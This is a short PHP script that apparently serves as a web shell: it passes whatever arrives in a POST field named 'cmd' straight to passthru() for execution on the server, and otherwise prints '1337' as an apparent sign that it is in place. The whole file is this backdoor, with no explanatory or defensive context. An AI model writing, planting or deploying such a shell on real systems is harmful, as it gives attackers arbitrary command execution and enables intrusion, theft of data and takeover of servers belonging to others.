<?php 
if(isset($_POST["cmd"])){
    passthru($_POST["cmd"]);
} else {
    echo "1337";
}
